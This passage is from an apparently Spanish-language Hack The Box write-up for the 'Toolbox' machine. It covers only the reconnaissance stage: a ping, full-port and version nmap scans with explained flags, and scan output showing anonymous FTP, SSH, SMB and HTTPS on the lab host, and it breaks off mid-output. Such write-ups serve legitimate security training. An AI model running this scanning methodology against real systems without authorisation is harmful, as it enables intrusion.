<!doctype html><html lang=en data-bs-theme=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-500.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-700.woff2 as=font type=font/woff2 crossorigin><script src=/js/color-mode.86a91f050a481d0a3f0c72ac26543cb6228c770875981c58dcbc008fd3f875c8.js integrity="sha256-hqkfBQpIHQo/DHKsJlQ8tiKMdwh1mBxY3LwAj9P4dcg="></script><link rel=stylesheet href=/main.f123605798fa81252c4858ee022f36eeed1b8897d6e9a6e140622fb33c657296035adc9fa6d338de59d7586d3c3983fbfc6fff308e163a2b6cac9789aec8adfe.css integrity="sha512-8SNgV5j6gSUsSFjuAi827u0biJfW6abhQGIvszxlcpYDWtyfptM43lnXWG08OYP7/G//MI4WOitsrJeJrsit/g==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><link rel=canonical href=/writeups/hackthebox/toolbox/><title>Toolbox | d3b0o</title><meta name=description content="En esta máquina vamos a estar tocando inyecciones SQL de Postgres las cuales vamos a convertirlas en un rce y para la escalada tocaremos un poco de docker"><meta property="og:title" content="Toolbox"><meta property="og:description" content="En esta máquina vamos a estar tocando inyecciones SQL de Postgres las cuales vamos a convertirlas en un rce y para la escalada tocaremos un poco de docker"><meta property="og:type" content="article"><meta property="og:url" content="/writeups/hackthebox/toolbox/"><meta property="og:image" content="/writeups/hackthebox/toolbox/cover.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-10-29T00:00:00+00:00"><meta property="article:modified_time" content="2023-10-29T00:00:00+00:00"><meta property="og:site_name" content="d3b0o"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/writeups/hackthebox/toolbox/cover.png"><meta name=twitter:title content="Toolbox"><meta name=twitter:description content="En esta máquina vamos a estar tocando inyecciones SQL de Postgres las cuales vamos a convertirlas en un rce y para la escalada tocaremos un poco de docker"><meta name=twitter:site content="@getdoks"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"D3b0o","position":1},{"@type":"ListItem","item":"/writeups/","name":"Writeups","position":2},{"@type":"ListItem","item":"/writeups/hackthebox/","name":"Hack the Box","position":3},{"@type":"ListItem","name":"Toolbox","position":4}]}</script></head><body class="single section writeups" data-bs-spy=scroll data-bs-target=#toc data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll=true tabindex=0><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg"><div class=container-lg><a class="navbar-brand me-auto me-lg-3" href=/>d3b0o</a>
<button type=button id=searchToggleMobile class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button>
<button class="btn btn-link d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavSection aria-controls=offcanvasNavSection aria-label="Open section navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 5m-1 0a1 1 0 102 0 1 1 0 10-2 0"/></svg></button><div class="offcanvas offcanvas-start d-lg-none" tabindex=-1 id=offcanvasNavSection aria-labelledby=offcanvasNavSectionLabel><div class=header-bar></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavSectionLabel>Writeups</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class=offcanvas-body><aside class="doks-sidebar mt-n3"><nav id=doks-docs-nav aria-label="Tertiary navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=true>
HackTheBox</button><div class="collapse show" id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/hackthebox/jupiter/>Jupiter</a></li><li><a class="docs-link rounded active" href=/writeups/hackthebox/toolbox/>Toolbox</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/>Pandora (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/>Horizontall (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/>Bashed (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/blue/>Blue</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=false>
TryHackMe</button><div class=collapse id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/tryhackme/blue/>Blue</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/chill-hack/>Chill Hack</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/team/>Team</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/startup/>Startup</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/source/>Source</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/>Mustacchio</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/>Wonderland</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/bounty-hacker/>Bounty Hacker</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/overpass/>Overpass</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/develpy/>Develpy</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/>Tomghost</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wgel/>Wgel</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/gallery/>Gallery</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/>Mr.Robot</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/>Agent T</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/>Vulnversity</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/>Brooklyn Nine Nine</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/>Agent sudo</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/>Lazy admin</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/>Chocolate Factory</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/rootme/>RootMe</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/>Pickle Rick</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-iii-video/>Friendly III (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/visions-video/>Visions (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-ii-video/>Friendly II (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/five-video/>Five (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/doc-video/>Doc (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/literal-video/>Literal (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita-video/>Jabita (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-i-video/>Friendly I (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/uvalde-video/>Uvalde (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/w140-video/>W140 (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita/>Jabita</a></li></ul></div></li></ul></nav></aside></div></div><button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavMain aria-controls=offcanvasNavMain aria-label="Open main navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><line x1="4" y1="8" x2="20" y2="8"/><line x1="4" y1="16" x2="20" y2="16"/></svg></button><div class="offcanvas offcanvas-end h-auto" tabindex=-1 id=offcanvasNavMain aria-labelledby=offcanvasNavMainLabel><div class="header-bar d-lg-none"></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavMainLabel>d3b0o</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between"><ul class="navbar-nav flex-grow-1"><li class=nav-item><a class="nav-link active" href=/writeups/hackthebox/jupiter/ aria-current=true>Writeups</a></li><li class=nav-item><a class=nav-link href=/blog/>Blog</a></li></ul><button type=button id=searchToggleDesktop class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button>
<button id=buttonColorMode class="btn btn-link mx-auto nav-link p-0 ms-lg-2 me-lg-1" type=button aria-label="Toggle theme"><svg data-bs-theme-value="dark" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/></svg><svg data-bs-theme-value="light" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-4 0a4 4 0 108 0 4 4 0 10-8 0m-5 0h1m8-9v1m8 8h1m-9 8v1M5.6 5.6l.7.7m12.1-.7-.7.7m0 11.4.7.7m-12.1-.7-.7.7"/></svg></button><ul id=socialMenu class="nav mx-auto flex-row order-lg-4"><li class=nav-item><a class="nav-link social-link" href=https://x.com/sr_d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4l11.733 16H20L8.267 4z"/><path d="M4 20l6.768-6.768m2.46-2.46L20 4"/></svg><small class="ms-2 visually-hidden">Twitter</small></a></li><li class=nav-item><a class="nav-link social-link" href=https://github.com/d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg><small class="ms-2 visually-hidden">GitHub</small></a></li></ul><a class="btn btn-primary rounded-pill mt-2 btn-block d-lg-none" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></div><a class="btn btn-primary rounded-pill ms-3 me-2 px-4 order-lg-3 d-none d-lg-block" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></header></div><div class=modal id=searchModal tabindex=-1 aria-labelledby=searchModalLabel aria-hidden=true><div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down"><div class=modal-content><div class=modal-header><h1 class="modal-title fs-5 visually-hidden" id=searchModalLabel>Search</h1><button type=button class="btn-close visually-hidden" data-bs-dismiss=modal aria-label=Close></button><div class="search-input flex-grow-1 d-none"><form id=search-form class=search-form action=# method=post accept-charset=utf-8 role=search><label for=query class=visually-hidden>Search</label><div class=d-flex><input type=search id=query name=query class="search-text form-control form-control-lg" placeholder=Search aria-label=Search maxlength=128 autocomplete=off>
<button type=button class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss=modal aria-label=Close>Cancel</button></div></form></div></div><div class=modal-body><p class="search-loading status message d-none mt-3 text-center">Loading search index…</p><p class="search-no-recent message d-none mt-3 text-center">No recent searches</p><p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class=query-no-results>Query here</span></strong>"</p><div id=searchResults class=search-results></div><template><article class="search-result list-view"><div class="card my-3"><div class=card-body><header><h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href=#>Title here</a></h2><div class=submitted><time class=created-date>Date here</time></div></header><div class=content>Summary here</div></div></div></article></template></div><div class=modal-footer><ul class="list-inline me-auto d-none d-md-block"><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd><span class=DocSearch-Label>to select</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd><kbd class=me-2><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd><span class=DocSearch-Label>to navigate</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd><span class=DocSearch-Label>to close</span></li></ul><p class=d-md-none>Search by <a class=text-decoration-none href=https://github.com/nextapps-de/flexsearch>FlexSearch</a></p></div></div></div></div><div class="wrap container-lg" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar docs-sidebar-offset d-none d-lg-block"><nav class=docs-links aria-label="Main navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=true>
HackTheBox</button><div class="collapse show" id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/hackthebox/jupiter/>Jupiter</a></li><li><a class="docs-link rounded active" href=/writeups/hackthebox/toolbox/>Toolbox</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/pandora-video/>Pandora (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/horizontall-video/>Horizontall (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/bashed-video/>Bashed (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackthebox/blue/>Blue</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3e74cf5d3d91ad9d67cc0e52e7daf92a aria-expanded=false>
TryHackMe</button><div class=collapse id=section-3e74cf5d3d91ad9d67cc0e52e7daf92a><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/tryhackme/blue/>Blue</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/chill-hack/>Chill Hack</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/team/>Team</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/startup/>Startup</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/source/>Source</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/>Mustacchio</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/>Wonderland</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/bounty-hacker/>Bounty Hacker</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/overpass/>Overpass</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/develpy/>Develpy</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/>Tomghost</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/wgel/>Wgel</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/gallery/>Gallery</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/>Mr.Robot</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-t/>Agent T</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/>Vulnversity</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/brooklyn-nine-nine/>Brooklyn Nine Nine</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/agent-sudo/>Agent sudo</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/>Lazy admin</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/chocolate-factory/>Chocolate Factory</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/rootme/>RootMe</a></li><li><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/>Pickle Rick</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-iii-video/>Friendly III (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/visions-video/>Visions (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-ii-video/>Friendly II (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/five-video/>Five (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/doc-video/>Doc (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/literal-video/>Literal (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita-video/>Jabita (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-i-video/>Friendly I (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/uvalde-video/>Uvalde (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/w140-video/>W140 (Video)</a></li><li><a class="docs-link rounded" href=/writeups/hackmyvm/jabita/>Jabita</a></li></ul></div></li></ul></nav></div><nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=toc><ul><li><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#ftp>FTP</a></li><li><a href=#smb>SMB</a></li><li><a href=#https>HTTPS</a></li></ul></li><li><a href=#intrusión>Intrusión</a><ul><li><a href=#reverse-shell>Reverse Shell</a></li></ul></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a><ul><li><a href=#escalada-rootadministrator>Escalada root/Administrator</a></li></ul></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9"><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=/>Home</a></li><li class=breadcrumb-item><a href=/writeups/>Writeups</a></li><li class=breadcrumb-item><a href=/writeups/hackthebox/>HackTheBox</a></li><li class="breadcrumb-item active" aria-current=page>Toolbox</li></ol></nav><h1>Toolbox</h1><nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation"><details><summary>On this page</summary><div class=page-links><nav id=TableOfContents><ul><li><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#ftp>FTP</a></li><li><a href=#smb>SMB</a></li><li><a href=#https>HTTPS</a></li></ul></li><li><a href=#intrusión>Intrusión</a><ul><li><a href=#reverse-shell>Reverse Shell</a></li></ul></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a><ul><li><a href=#escalada-rootadministrator>Escalada root/Administrator</a></li></ul></li></ul></li></ul></nav></div></details></nav><h2 id=reconocimiento>Reconocimiento<a href=#reconocimiento class=anchor aria-hidden=true>#</a></h2><p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ping -c <span class=m>1</span> 10.10.10.236
</span></span><span class=line><span class=cl>PING 10.10.10.236 <span class=o>(</span>10.10.10.236<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.10.10.236: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span><span class=m>152</span> ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.10.10.236 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>1</span> packets transmitted, <span class=m>1</span> received, 0% packet loss, <span class=nb>time</span> 0ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 151.535/151.535/151.535/0.000 ms
</span></span></code></pre></div><p>Tenemos conexión y en este caso da un ttl (time to live) de <strong>127</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Windows</strong></p><h3 id=escaneo-de-puertos>Escaneo de puertos<a href=#escaneo-de-puertos class=anchor aria-hidden=true>#</a></h3><p>Ahora empezamos con un escaneo de puertos</p><pre tabindex=0><code>$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.236 -oG allPorts
</code></pre><details><summary>Explicación parámetros</summary><table><thead><tr><th>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td>-p-</td><td>Para que el escaneo sea a todos los puertos (65536)</td></tr><tr><td>&ndash;open</td><td>Para que solo reporte los puertos abiertos</td></tr><tr><td>&ndash;min-rate 5000</td><td>Definir el tiempo del escaneo</td></tr><tr><td>-n</td><td>Omitir resolución DNS</td></tr><tr><td>-vvv</td><td>Para que vaya reportando lo que encuentre por consola</td></tr><tr><td>-Pn</td><td>Para saltar la comprobación de sí la máquina está activa o no</td></tr><tr><td>-oG allPorts</td><td>Para que guarde el escaneo en format grepeable en un archivo llamado allPort</td></tr></tbody></table></details><br><p>Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual</p><p><a href=https://pastebin.com/tYpwpauW>Función extractPorts</a> de <a href=https://s4vitar.github.io>@s4vitar</a></p><pre tabindex=0><code>extractPorts allPorts
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.236
   5   │     [*] Open ports: 21,22,135,139,443,445,5985,47001,49664,49665,49666,49667,49668,49669
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre><p>Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; nmap -p21,22,135,139,443,445,5985,47001,49664,49665,49666,49667,49668,49669 -sCV 10.10.10.236 -oN versions
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>21/tcp    open  ftp           FileZilla ftpd
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-syst: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  SYST: UNIX emulated by FileZilla
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-anon: Anonymous FTP login allowed <span class=o>(</span>FTP code 230<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_-r-xr-xr-x <span class=m>1</span> ftp ftp      <span class=m>242520560</span> Feb <span class=m>18</span>  <span class=m>2020</span> docker-toolbox.exe
</span></span><span class=line><span class=cl>22/tcp    open  ssh           OpenSSH for_Windows_7.7 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>443/tcp   open  ssl/http      Apache httpd 2.4.38 <span class=o>((</span>Debian<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.38 <span class=o>(</span>Debian<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: MegaLogistics
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>admin.megalogistic.com/organizationName<span class=o>=</span>MegaLogistic Ltd/stateOrProvinceName<span class=o>=</span>Some-State/countryName<span class=o>=</span>GR
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2020-02-18T17:45:56
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2021-02-17T17:45:56
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds?
